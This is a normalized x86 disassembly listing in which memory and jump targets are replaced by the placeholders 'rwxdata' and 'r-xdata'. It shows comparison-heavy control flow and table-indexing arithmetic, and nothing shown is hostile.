mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp - 0x24 ]
jl r-xdata
mov [ ebp - 0x1c ] 0x4
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x1
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp - 0x4c ]
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax * 4 + rwxdata ] 0x20
jl r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx * 4 + rwxdata ] 0x20
jge r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0xc ]
cmp [ edx * 4 + rwxdata ] 0x20
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax * 4 + rwxdata ] 0x20
jge r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ ecx * 4 + rwxdata ] 0xffffffff
jmp r-xdata
mov edx [ rwxdata ]
push edx
call sub_40b923
add esp 0x4
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x2
mov ecx [ rwxdata ]
shl ecx 0xf
mov edx [ rwxdata ]
shl edx 0xb
lea ecx [ ecx + edx + rwxdata ]
mov edx [ rwxdata ]
shl edx 0x7
add ecx edx
mov edx [ rwxdata ]
mov ecx [ ecx + edx * 8 + 0x4 ]
imul ecx ecx 0x1f40
mov edx [ rwxdata ]
shl edx 0xf
mov esi [ rwxdata ]
shl esi 0xb
lea edx [ edx + esi + rwxdata ]
mov esi [ rwxdata ]
shl esi 0x7
add edx esi
mov esi [ rwxdata ]
mov edx [ edx + esi * 8 ]
mov [ ecx + edx * 4 + rwxdata ] eax
mov eax [ rwxdata ]
shl eax 0xf
mov ecx [ rwxdata ]
shl ecx 0xb
lea edx [ eax + ecx + rwxdata ]
mov eax [ rwxdata ]
shl eax 0x7
add edx eax
mov ecx [ rwxdata ]
mov edx [ edx + ecx * 8 ]
add edx 0x1
mov eax [ rwxdata ]
shl eax 0x7
mov ecx [ rwxdata ]
shl ecx 0xb
mov esi [ rwxdata ]
shl esi 0xf
lea ecx [ esi + ecx + rwxdata ]
add ecx eax
mov eax [ rwxdata ]
mov [ ecx + eax * 8 ] edx
mov eax [ rwxdata ]
shl eax 0xf
mov ecx [ rwxdata ]
shl ecx 0xb
lea edx [ eax + ecx + rwxdata ]
mov eax [ rwxdata ]
shl eax 0x7
add edx eax
mov ecx [ rwxdata ]
mov eax [ rwxdata ]
mov [ edx + ecx * 8 + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx 0x2
mov edx [ rwxdata ]
imul edx edx 0x1f40
mov eax [ rwxdata ]
shl eax 0xf
mov esi [ rwxdata ]
shl esi 0xb
lea eax [ eax + esi + rwxdata ]
mov esi [ rwxdata ]
shl esi 0x7
add eax esi
mov esi [ rwxdata ]
mov eax [ eax + esi * 8 ]
mov [ edx + eax * 4 + rwxdata ] ecx
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
shl edx 0xf
mov eax [ rwxdata ]
shl eax 0xb
lea ecx [ edx + eax + rwxdata ]
mov edx [ rwxdata ]
shl edx 0x7
add ecx edx
mov eax [ rwxdata ]
mov ecx [ ecx + eax * 8 ]
add ecx 0x1
mov edx [ rwxdata ]
shl edx 0x7
mov eax [ rwxdata ]
shl eax 0xb
mov esi [ rwxdata ]
shl esi 0xf
lea eax [ esi + eax + rwxdata ]
add eax edx
mov edx [ rwxdata ]
mov [ eax + edx * 8 ] ecx
jmp r-xdata
mov eax [ ebp - 0x54 ]
add eax 0x1
mov [ ebp - 0x54 ] eax
cmp [ ebp - 0x34 ] 0x10
jge r-xdata
cmp [ ebp - 0x50 ] 0x0
jl r-xdata
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x2c ]
jl r-xdata
mov edx [ ebp - 0x20 ]
cmp edx [ ebp - 0x4c ]
jl r-xdata
mov edx [ ebp - 0x4c ]
cmp edx [ ebp - 0x24 ]
jl r-xdata
mov [ ebp - 0x1c ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x1
mov edx [ ebp - 0x4c ]
cmp edx [ ebp - 0x18 ]
jl r-xdata
mov ecx [ ebp - 0x4c ]
cmp ecx [ ebp - 0x2c ]
jl r-xdata
mov edx [ ebp - 0x2c ]
cmp edx [ ebp - 0x20 ]
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax * 4 + rwxdata ] 0x40
jl r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx * 4 + rwxdata ] 0x40
jge r-xdata
mov edx [ ebp - 0x2c ]
add edx 0x1
mov [ ebp - 0x2c ] edx
mov edx [ ebp - 0xc ]
cmp [ edx * 4 + rwxdata ] 0x40
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax * 4 + rwxdata ] 0x40
jge r-xdata
mov ecx [ ebp - 0x2c ]
add ecx 0x1
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x14 ] 0x10
jge r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
shl eax 0xf
mov ecx [ ebp - 0x54 ]
shl ecx 0xb
lea edx [ eax + ecx + rwxdata ]
mov eax [ ebp - 0x30 ]
shl eax 0x7
add edx eax
mov ecx [ ebp - 0x34 ]
mov [ edx + ecx * 8 ] 0x0
mov edx [ ebp - 0x14 ]
shl edx 0xf
mov eax [ ebp - 0x54 ]
shl eax 0xb
lea ecx [ edx + eax + rwxdata ]
mov edx [ ebp - 0x30 ]
shl edx 0x7
add ecx edx
mov eax [ ebp - 0x34 ]
mov [ ecx + eax * 8 + 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x50 ] 0x8
jl r-xdata
cmp [ ebp - 0x50 ] 0x8
jge r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x4c ]
jl r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov [ ebp - 0x1c ] 0x1
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x1
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
mov edx [ ebp - 0x20 ]
cmp edx [ ebp - 0x4c ]
jl r-xdata
mov eax [ ebp - 0x4c ]
cmp eax [ ebp - 0x20 ]
jl r-xdata
mov ecx [ ebp - 0x20 ]
cmp ecx [ ebp - 0x2c ]
jl r-xdata
mov edx [ ebp - 0x4c ]
cmp edx [ ebp - 0x20 ]
jl r-xdata
mov eax [ ebp - 0x2c ]
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax * 4 + rwxdata ] 0x80
jl r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx * 4 + rwxdata ] 0x80
jge r-xdata
mov edx [ ebp - 0x4c ]
add edx 0x1
mov [ ebp - 0x4c ] edx
mov edx [ ebp - 0xc ]
cmp [ edx * 4 + rwxdata ] 0x80
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax * 4 + rwxdata ] 0x80
jge r-xdata
mov ecx [ ebp - 0x4c ]
add ecx 0x1
mov [ ebp - 0x4c ] ecx
cmp [ rwxdata ] 0xc8
jl r-xdata
mov [ ebp - 0x54 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x30 ]
add ecx 0x1
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x34 ]
add edx 0x1
mov [ ebp - 0x34 ] edx
cmp [ ebp - 0x50 ] 0x10
jl r-xdata
cmp [ ebp - 0x50 ] 0x10
jge r-xdata
mov [ ebp - 0x3c ] 0x3
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0x20 ]
jl r-xdata
mov [ ebp - 0x1c ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x1
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp - 0x4c ]
jl r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x20 ]
jl r-xdata
mov ecx [ ebp - 0x20 ]
cmp ecx [ ebp - 0x2c ]
jl r-xdata
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x20 ]
jl r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
mov ecx [ ebp - 0x4c ]
cmp ecx [ ebp - 0x24 ]
jl r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0x2c ]
jl r-xdata
mov edx [ ebp - 0x20 ]
cmp edx [ ebp - 0x4c ]
jl r-xdata
mov eax [ ebp - 0x4c ]
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov eax [ ebp - 0xc ]
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0xc ]
cmp [ ecx * 4 + rwxdata ] 0x100
jge r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax * 4 + rwxdata ] 0x100
jge r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
cmp [ rwxdata ] 0xc8
jge r-xdata
cmp [ rwxdata ] 0x100
jl r-xdata
cmp [ ebp - 0x54 ] 0x10
jge r-xdata
cmp [ ebp - 0x50 ] 0x20
jl r-xdata
cmp [ ebp - 0x50 ] 0x20
jge r-xdata
mov [ ebp - 0x3c ] 0x4
mov [ ebp - 0x1c ] 0x3
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x1
mov edx [ ebp - 0x2c ]
cmp edx [ ebp - 0x4c ]
jl r-xdata
mov ecx [ ebp - 0x4c ]
cmp ecx [ ebp - 0x2c ]
jl r-xdata
mov edx [ ebp - 0x2c ]
cmp edx [ ebp - 0x18 ]
jl r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0x18 ]
jl r-xdata
mov edx [ ebp - 0x20 ]
cmp edx [ ebp - 0x24 ]
jl r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x24 ]
jl r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x4c ]
jl r-xdata
mov ecx [ ebp - 0x20 ]
cmp ecx [ ebp - 0x24 ]
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x4c ]
jl r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov edx [ ebp - 0x24 ]
add edx 0x1
mov [ ebp - 0x24 ] edx
mov ecx [ ebp - 0x24 ]
add ecx 0x1
mov [ ebp - 0x24 ] ecx
mov ecx [ ebp - 0x48 ]
sub ecx 0x1f4
mov [ ebp - 0x48 ] ecx
mov edx [ ebp - 0x44 ]
mov [ rwxdata ] edx
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x30 ] 0x0
jmp r-xdata
cmp [ ebp - 0x50 ] 0x40
jl r-xdata
cmp [ ebp - 0x50 ] 0x40
jge r-xdata
mov [ ebp - 0x3c ] 0x5
mov edx [ ebp - 0x4c ]
cmp edx [ ebp - 0x2c ]
jl r-xdata
mov eax [ ebp - 0x2c ]
cmp eax [ ebp - 0x20 ]
jl r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0x2c ]
jl r-xdata
mov edx [ ebp - 0x4c ]
cmp edx [ ebp - 0x18 ]
jl r-xdata
mov eax [ ebp - 0x2c ]
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov eax [ ebp - 0x2c ]
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x20 ]
jl r-xdata
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x2c ]
jl r-xdata
mov [ ebp - 0x10 ] 0x2
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x4c ]
jl r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0x18 ]
jl r-xdata
mov [ ebp - 0x10 ] 0x2
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x20 ]
jl r-xdata
mov [ ebp - 0x10 ] 0x2
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
cmp [ ebp - 0x30 ] 0x10
jge r-xdata
cmp [ ebp - 0x50 ] 0x80
jl r-xdata
cmp [ ebp - 0x50 ] 0x80
jge r-xdata
mov [ ebp - 0x3c ] 0x6
mov edx [ ebp - 0x20 ]
cmp edx [ ebp - 0x2c ]
jl r-xdata
mov eax [ ebp - 0x4c ]
cmp eax [ ebp - 0x20 ]
jl r-xdata
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp - 0x18 ]
jl r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x2c ]
jl r-xdata
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x4c ]
jl r-xdata
mov eax [ ebp - 0x4c ]
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp - 0x18 ]
jl r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x2c ]
jl r-xdata
mov [ ebp - 0x10 ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x20 ]
jl r-xdata
mov [ ebp - 0x10 ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ ebp - 0x10 ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
jmp r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
cmp [ ebp - 0x50 ] 0x100
jl r-xdata
cmp [ ebp - 0x50 ] 0x100
jge r-xdata
mov [ ebp - 0x3c ] 0x7
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x2c ]
jl r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x4c ]
jl r-xdata
mov ecx [ ebp - 0x4c ]
cmp ecx [ ebp - 0x18 ]
jl r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x4c ]
jl r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov edx [ ebp - 0x2c ]
cmp edx [ ebp - 0x20 ]
jl r-xdata
mov [ ebp - 0x10 ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ ebp - 0x10 ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov eax [ ebp - 0x54 ]
add eax 0x1
mov [ ebp - 0x54 ] eax
cmp [ ebp - 0x34 ] 0x10
jge r-xdata
mov [ rwxdata ] 0x0
mov edx [ ebp - 0x1c ]
shl edx 0xd
sar edx 0xf
and edx 0x1
je r-xdata
cmp [ ebp - 0x50 ] 0x200
jge r-xdata
mov [ ebp - 0x3c ] 0x8
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x4c ]
jl r-xdata
mov ecx [ ebp - 0x20 ]
cmp ecx [ ebp - 0x18 ]
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov [ ebp - 0x10 ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
jmp r-xdata
mov eax [ ebp - 0x14 ]
shl eax 0xf
mov ecx [ ebp - 0x54 ]
shl ecx 0xb
lea edx [ eax + ecx + rwxdata ]
mov eax [ ebp - 0x30 ]
shl eax 0x7
add edx eax
mov ecx [ ebp - 0x34 ]
cmp [ edx + ecx * 8 ] 0x2
jl r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov [ ebp - 0x3c ] 0x9
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x20 ]
jl r-xdata
mov [ ebp - 0x10 ] 0x2
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ ebp - 0x10 ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov ecx [ ebp - 0x30 ]
add ecx 0x1
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov edx [ ebp - 0x14 ]
and edx 0xf
shl edx 0xc
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x54 ]
and eax 0xf
shl eax 0x8
or eax [ ebp - 0x3c ]
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x30 ]
and ecx 0xf
shl ecx 0x4
or ecx [ ebp - 0x3c ]
mov [ ebp - 0x3c ] ecx
mov edx [ ebp - 0x3c ]
or edx [ ebp - 0x34 ]
mov [ ebp - 0x3c ] edx
cmp [ rwxdata ] 0x0
jne r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp - 0x1c ]
shl ecx 0xe
sar ecx 0xf
and ecx 0x1
je r-xdata
mov [ ebp - 0x10 ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov edx [ ebp - 0x34 ]
add edx 0x1
mov [ ebp - 0x34 ] edx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ rwxdata ]
mov ecx [ ebp - 0x3c ]
mov [ eax * 4 + rwxdata ] ecx
mov edx [ rwxdata ]
mov [ ebp - 0x50 ] edx
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp - 0x1c ]
shl eax 0xf
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ ebp - 0xc ]
cmp edx [ rwxdata ]
jge r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov edx [ rwxdata ]
add edx 0x3
mov [ rwxdata ] edx
mov eax [ ebp - 0x10 ]
shl eax 0xd
sar eax 0xf
and eax 0x1
je r-xdata
